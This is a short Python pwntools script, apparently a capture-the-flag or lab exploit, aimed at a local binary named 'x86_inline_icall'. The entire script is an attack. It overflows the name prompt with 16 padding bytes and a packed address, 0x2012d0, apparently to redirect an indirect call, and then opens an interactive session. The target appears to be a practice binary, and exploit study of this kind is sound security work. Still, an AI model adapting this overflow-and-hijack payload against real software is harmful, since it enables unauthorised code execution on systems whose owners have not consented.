from pwn import *
context.log_level = "debug"
r = process('./x86_inline_icall')
vul_addr='a'*16+p64(0x2012d0)
r.recvuntil("plz input your name:\n")
r.sendline(vul_addr)
r.interactive()


